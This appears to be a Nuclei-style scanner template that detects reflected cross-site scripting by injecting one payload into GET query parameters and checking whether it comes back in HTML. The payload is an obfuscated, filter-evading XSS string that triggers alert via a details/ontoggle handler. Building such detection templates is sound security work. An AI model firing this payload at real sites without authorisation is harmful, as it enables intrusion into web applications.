id: fuzz-reflection-xss-custom-2

info:
  name: Custom Reflection XSS Detection with Advanced Payload
  author: netbaan
  severity: low
  description: |
    This template is designed to detect reflection XSS vulnerabilities using a specified advanced payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      reflection:
        - "<details/open/ontoggle=\"self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];\">"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"